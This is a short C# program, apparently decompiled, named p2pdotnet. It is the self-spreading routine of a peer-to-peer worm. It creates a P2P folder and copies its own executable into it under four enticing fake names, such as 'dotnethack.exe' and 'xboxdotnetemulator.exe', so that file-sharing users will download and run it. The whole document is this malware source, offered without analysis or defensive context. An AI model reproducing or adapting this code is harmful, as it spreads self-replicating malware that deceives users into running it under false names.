using System.IO;
using System.Reflection;

internal class p2pdotnet
{
	public static void Main()
	{
		Module module = Assembly.GetExecutingAssembly().GetModules()[0];
		Directory.CreateDirectory("\\P2P");
		string[] array = new string[4] { "dotnethack.exe", "xboxdotnetemulator.exe", "linuxdotnet.exe", "dosdotnet.exe" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				File.Copy(module.FullyQualifiedName, "\\P2P\\" + text);
			}
			catch
			{
			}
		}
	}
}
